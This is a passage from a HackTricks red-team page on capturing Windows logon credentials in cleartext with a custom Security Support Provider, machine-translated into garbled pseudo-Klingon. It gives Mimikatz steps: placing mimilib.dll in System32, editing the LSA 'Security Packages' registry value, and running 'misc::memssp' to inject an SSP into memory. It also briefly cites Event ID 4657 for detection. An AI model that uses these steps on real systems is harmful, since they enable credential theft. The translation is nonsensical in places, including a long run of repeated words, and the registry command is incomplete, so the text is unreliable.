<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> jImej</summary>

Ha'DIbaH HackTricks vItlhutlh:

* **company advertised in HackTricks** be'nal **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) ghaH **Get**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) jImej, [**NFTs**](https://opensea.io/collection/the-peass-family) jImej
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) be'nal [**telegram group**](https://t.me/peass) jImej be'nal **Join** **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) be'nal [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


## Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.

### Mimilib

You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
Drop the dll in `C:\Windows\System32\`\
Get a list existing LSA Security Packages:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Security Support Provider list (Security Packages) vItlhutlh `mimilib.dll` QaQ jImej:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
'ej reboot DaH jImej log 'e' logHommey 'e' C:\Windows\System32\kiwissp.log

### ram

Mimikatz vItlhutlh 'e' ram vItlhutlh 'e' inject. (mey' vItlhutlh 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e' 'e'
```powershell
privilege::debug
misc::memssp
```
### tlhIngan Hol

### QapHa'

Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` creation/change audited.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhIngan Hol</strong></a><strong>!</strong></summary>

QapHa' HackTricks vItlhutlh:

* QapHa' **loDnI'wI' vItlhutlh HackTricks** be'nal **HackTricks PDF** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) yIlo'!
* **PEASS & HackTricks swag** [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) yIlo'!
* **The PEASS Family** [**The PEASS Family**](https://opensea.io/collection/the-peass-family) yIlo'! [**NFTs**](https://opensea.io/collection/the-peass-family) yIlo'!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
